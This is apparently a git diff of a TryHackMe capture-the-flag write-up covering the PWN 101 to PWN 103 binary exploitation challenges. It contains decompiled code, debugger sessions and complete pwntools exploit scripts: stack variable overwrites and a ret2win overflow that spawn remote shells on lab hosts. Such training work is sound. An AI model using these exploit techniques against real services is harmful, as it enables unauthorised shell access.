@@ -8,11 +8,8 @@ categories: [Pwn 101]
 tags: [binary exploitation, Tryhackme ]
 ---
 
-Let's download the task file
-
-![img-description](1.png)
-
-After decompiling the task file with ghidra we get an idea that their is a possible buffer overflow in the code since `gets()` is used which is a dangerous function
+## PWN 101
+Let's download the task file and decompile it. After decompiling the task file with ghidra we get an idea that their is a possible buffer overflow in the code since `gets()` is used which is a dangerous function
 
 ```c
 void main(void)
@@ -94,16 +91,8 @@ Let's create a script to automate that
 ```python
 from pwn import *
 
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'debug'
-
-# Start the executable
 io = remote(sys.argv[1], sys.argv[2])
-
-# Send the payload
 io.sendlineafter(b':', b"A"*100)
-
-# Receive the flag
 io.interactive()
 ```
 
@@ -112,59 +101,332 @@ We get a shell in the system since the code calls `/bin/sh` after the overflow
 ```shell
 pl4int3xt@archlinux ~/D/p/pwn101 [1]> python3 pwn101.py 10.10.95.255 9001
 [+] Opening connection to 10.10.95.255 on port 9001: Done
-[DEBUG] Received 0x110 bytes:
-    00000000  20 20 20 20  20 20 20 e2  94 8c e2 94  ac e2 94 90  │    │   ·│····│····│
-    00000010  e2 94 ac e2  94 80 e2 94  90 e2 94 ac  20 e2 94 ac  │····│····│····│ ···│
-    00000020  e2 94 ac 20  e2 94 ac e2  94 8c e2 94  80 e2 94 90  │··· │····│····│····│
-    00000030  e2 94 8c e2  94 80 e2 94  90 e2 94 ac  e2 94 8c e2  │····│····│····│····│
-    00000040  94 80 e2 94  8c e2 94 ac  e2 94 90 e2  94 8c e2 94  │····│····│····│····│
-    00000050  80 e2 94 90  0a 20 20 20  20 20 20 20  20 e2 94 82  │····│·   │    │ ···│
-    00000060  20 e2 94 9c  e2 94 ac e2  94 98 e2 94  94 e2 94 ac  │ ···│····│····│····│
-    00000070  e2 94 98 e2  94 9c e2 94  80 e2 94 a4  e2 94 9c e2  │····│····│····│····│
-    00000080  94 80 e2 94  a4 e2 94 82  20 20 e2 94  9c e2 94 b4  │····│····│  ··│····│
-    00000090  e2 94 90 e2  94 82 e2 94  82 e2 94 82  e2 94 9c e2  │····│····│····│····│
-    000000a0  94 a4 20 0a  20 20 20 20  20 20 20 20  e2 94 b4 20  │·· ·│    │    │··· │
-    000000b0  e2 94 b4 e2  94 94 e2 94  80 20 e2 94  b4 20 e2 94  │····│····│· ··│· ··│
-    000000c0  b4 20 e2 94  b4 e2 94 b4  20 e2 94 b4  e2 94 94 e2  │· ··│····│ ···│····│
-    000000d0  94 80 e2 94  98 e2 94 b4  20 e2 94 b4  e2 94 b4 20  │····│····│ ···│··· │
-    000000e0  e2 94 b4 e2  94 94 e2 94  80 e2 94 98  0a 20 20 20  │····│····│····│·   │
-    000000f0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 70 77  │    │    │    │  pw│
-    00000100  6e 20 31 30  31 20 20 20  20 20 20 20  20 20 20 0a  │n 10│1   │    │   ·│
-    00000110
-[DEBUG] Received 0x10d bytes:
-    b'\n'
-    b'Hello!, I am going to shopping.\n'
-    b'My mom told me to buy some ingredients.\n'
-    b'Ummm.. But I have low memory capacity, So I forgot most of them.\n'
-    b'Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D\n'
-    b'\n'
-    b'Type the required ingredients to make briyani: \n'
-[DEBUG] Sent 0x3d bytes:
-    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
 [*] Switching to interactive mode
-D
-
 Type the required ingredients to make briyani: 
-[DEBUG] Received 0x26 bytes:
-    b"Thanks, Here's a small gift for you <3"
-Thanks, Here's a small gift for you <3[DEBUG] Received 0x1 bytes:
-    b'\n'
-
+Thanks, Here's a small gift for you <3
 $ ls
-[DEBUG] Sent 0x3 bytes:
-    b'ls\n'
-[DEBUG] Received 0x19 bytes:
-    b'flag.txt\n'
-    b'pwn101\n'
-    b'pwn101.c\n'
 flag.txt
 pwn101
 pwn101.c
 $ cat flag.txt
-[DEBUG] Sent 0xd bytes:
-    b'cat flag.txt\n'
-[DEBUG] Received 0x20 bytes:
-    b"THM{REDACTED..}}\n"
 THM{REDACTED..}
 $ 
 ```
+
+## PWN 102
+Let's download and decompile the binary with ghidra
+
+```c
+void main(void){
+
+  undefined local_78 [104];
+  int local_10;
+  int local_c;
+  
+  setup();
+  banner();
+  local_c = 0xbadf00d;
+  local_10 = -0x11e2153;
+  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
+  __isoc99_scanf(&DAT_00100b66,local_78);
+  if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) {
+    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
+    system("/bin/sh");
+    return;
+  }
+  puts("I\'m feeling dead, coz you said I need bad food :(");
+                    /* WARNING: Subroutine does not return */
+  exit(0x539);
+
+}
+```
+
+The binary checks if `local_c = 0xc0ff33` and `local_10 = 0xc0d3`. but initial they are set to this
+
+```c
+local_c = 0xbadf00d;
+local_10 = -0x11e2153;
+```
+
+So basically we want to overwrite the variables in the stack and assign them as follows
+```c
+local_c = 0xc0ff33;
+local_10 = 0xc0d3;
+```
+
+Let's check the security protections with checksec
+
+```shell
+pl4int3xt@archlinux ~/D/p/pwn102> checksec --file=pwn102.pwn102 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   73 Symbols	 No	pwn102.pwn102
+```
+
+We disassemble main function and notice the first compare at `0x0000000000000959 <+91>:	cmp    DWORD PTR [rbp-0x4],0xc0ff33` 
+
+```shell
+pwndbg> disassemble main
+Dump of assembler code for function main:
+   0x00000000000008fe <+0>:	push   rbp
+   0x00000000000008ff <+1>:	mov    rbp,rsp
+   0x0000000000000902 <+4>:	sub    rsp,0x70
+   0x0000000000000906 <+8>:	mov    eax,0x0
+   0x000000000000090b <+13>:	call   0x88a <setup>
+   0x0000000000000910 <+18>:	mov    eax,0x0
+   0x0000000000000915 <+23>:	call   0x8eb <banner>
+   0x000000000000091a <+28>:	mov    DWORD PTR [rbp-0x4],0xbadf00d
+   0x0000000000000921 <+35>:	mov    DWORD PTR [rbp-0x8],0xfee1dead
+   0x0000000000000928 <+42>:	mov    edx,DWORD PTR [rbp-0x8]
+   0x000000000000092b <+45>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x000000000000092e <+48>:	mov    esi,eax
+   0x0000000000000930 <+50>:	lea    rdi,[rip+0x212]        # 0xb49
+   0x0000000000000937 <+57>:	mov    eax,0x0
+   0x000000000000093c <+62>:	call   0x730 <printf@plt>
+   0x0000000000000941 <+67>:	lea    rax,[rbp-0x70]
+   0x0000000000000945 <+71>:	mov    rsi,rax
+   0x0000000000000948 <+74>:	lea    rdi,[rip+0x217]        # 0xb66
+   0x000000000000094f <+81>:	mov    eax,0x0
+   0x0000000000000954 <+86>:	call   0x750 <__isoc99_scanf@plt>
+   0x0000000000000959 <+91>:	cmp    DWORD PTR [rbp-0x4],0xc0ff33
+   0x0000000000000960 <+98>:	jne    0x992 <main+148>
+   0x0000000000000962 <+100>:	cmp    DWORD PTR [rbp-0x8],0xc0d3
+   0x0000000000000969 <+107>:	jne    0x992 <main+148>
+   0x000000000000096b <+109>:	mov    edx,DWORD PTR [rbp-0x8]
+   0x000000000000096e <+112>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000000971 <+115>:	mov    esi,eax
+   0x0000000000000973 <+117>:	lea    rdi,[rip+0x1ef]        # 0xb69
+   0x000000000000097a <+124>:	mov    eax,0x0
+   0x000000000000097f <+129>:	call   0x730 <printf@plt>
+   0x0000000000000984 <+134>:	lea    rdi,[rip+0x1f4]        # 0xb7f
+   0x000000000000098b <+141>:	call   0x720 <system@plt>
+   0x0000000000000990 <+146>:	jmp    0x9a8 <main+170>
+   0x0000000000000992 <+148>:	lea    rdi,[rip+0x1ef]        # 0xb88
+   0x0000000000000999 <+155>:	call   0x710 <puts@plt>
+   0x000000000000099e <+160>:	mov    edi,0x539
+   0x00000000000009a3 <+165>:	call   0x760 <exit@plt>
+   0x00000000000009a8 <+170>:	leave
+   0x00000000000009a9 <+171>:	ret
+End of assembler dump.
+pwndbg>
+```
+
+we run cyclic 200 and put our break point at `0x0000000000000959` which is the first compare to get the offset
+
+```shell
+pwndbg> b *0x0000555555400959
+Breakpoint 1 at 0x555555400959
+pwndbg> cyclic 200
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+pwndbg> run
+Starting program: /home/pl4int3xt/Documents/pwn/pwn102/pwn102.pwn102 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 102          
+
+I need badf00d to fee1dead
+Am I right? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+
+Breakpoint 1, 0x0000555555400959 in main ()
+```
+
+Let's look at the values that overflowed and overwrote the `$rbp - 4` register to get the offset
+
+```shell
+pwndbg> x/s $rbp-4
+0x7fffffffe65c:	"aaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
+pwndbg> cyclic -l aaaaoaaa
+Finding cyclic pattern of 8 bytes: b'aaaaoaaa' (hex: 0x616161616f616161)
+Found at offset 108
+```
+
+We need to overwrite `$rbp - 4` with `0xc0ff33` and `$rbp - 8` with `0xc0d3`. We need also to know the offsets of both registers. If the offset of `$rbp-4` is `108` the offset of `$rbp-8` will be `104`
+
+```shell
+$rbp-4 = 108
+$rbp-8 = 104
+```
+
+Let's create a python script to overwrite those variables and get a shell
+
+```python
+import sys
+from pwn import *
+from struct import *
+
+exe = './pwn102.pwn102'
+elf = context.binary = ELF(exe, checksec=False)
+
+io = remote("10.10.31.35", 9002)
+
+rbp_8 = pack("<I", 0xc0d3)
+rbp_4 = pack("<I", 0xc0ff33)
+
+payload = flat(
+    asm('nop') * 104,
+    rbp_8,
+    rbp_4
+)
+
+write('payload', payload)
+io.sendlineafter(b'?', payload)
+io.interactive()
+```
+
+Let's run the code using the remote server and the provided port to get a shell and the flag
+
+```shell
+pl4int3xt@archlinux ~/D/p/pwn102> python3 pwn102.py 
+[+] Opening connection to 10.10.31.35 on port 9002: Done
+[*] Switching to interactive mode
+Yes, I need c0ff33 to c0d3
+$ ls
+flag.txt
+pwn102
+pwn102.c
+$ cat flag.txt
+THM{REDACTED..}
+$
+```
+
+## PWN 103
+Let's download the task file and decompile it with ghidra. `general()` has a buffer overflow.
+
+```c
+void general(void){
+  int iVar1;
+  char local_28 [32];
+  
+  puts(&DAT_004023aa);
+  puts(&DAT_004023c0);
+  puts(&DAT_004023e8);
+  puts(&DAT_00402418);
+  printf("------[pwner]: ");
+  __isoc99_scanf(&DAT_0040245c,local_28);
+  iVar1 = strcmp(local_28,"yes");
+  if (iVar1 == 0) {
+    puts(&DAT_00402463);
+    main();
+  }
+  else {
+    puts(&DAT_0040247f);
+  }
+  return;
+}
+```
+
+`admins_only()` seems interesting since it opens a shell for us. All we need to to is overflow the buffer at `general()` and return to `admins_only()`.
+
+```c
+void admins_only(void){
+  puts(&DAT_00403267);
+  puts(&DAT_0040327c);
+  system("/bin/sh");
+  return;
+}
+```
+
+Let's fire up pwndbg and crash the program
+
+```shell
+pwndbg> cyclic 100
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+pwndbg> run
+Starting program: /home/pl4int3xt/Documents/pwn/pwn103/pwn103.pwn103 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  [THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1) 📢 Announcements
+2) 📜 Rules
+3) 🗣  General
+4) 🏠 rooms discussion
+5) 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 3
+
+🗣  General:
+
+------[jopraveen]: Hello pwners 👋
+------[jopraveen]: Hope you're doing well 😄
+------[jopraveen]: You found the vuln, right? 🤔
+
+------[pwner]: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+Try harder!!! 💪
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401377 in general ()
+```
+
+We get the offset of the binary is 40
+
+```shell
+pwndbg> cyclic -l faaaaaaa
+Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
+Found at offset 40
+```
+
+Let's create a script to automate the process.
+
+```python
+from pwn import *
+
+exe = './pwn103.pwn103'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+io = remote("10.10.135.73" ,9003)
+
+admins_only = elf.sym.admins_only
+
+payload = flat(
+    asm('nop') * 40,
+    p64(0x0000000000401016),
+    admins_only
+)
+
+write('payload', payload)
+io.sendlineafter(b':', '3')
+io.sendlineafter(b':', payload)
+io.interactive()
+```
+
+Running the script on the remote server we get a shell and the flag
+
+```shell
+pl4int3xt@archlinux ~/D/p/pwn103> python3 pwn103.py
+[+] Opening connection to 10.10.135.73 on port 9003: Done
+[*] Switching to interactive mode
+------[jopraveen]: Hello pwners 👋
+------[jopraveen]: Hope you're doing well 😄
+------[jopraveen]: You found the vuln, right? 🤔
+------[pwner]: 
+Try harder!!! 💪
+
+👮  Admins only:
+
+Welcome admin 😄
+$ ls
+flag.txt
+pwn103
+pwn103.c
+$ cat flag.txt
+THM{REDACTED..}
+$
+```
+
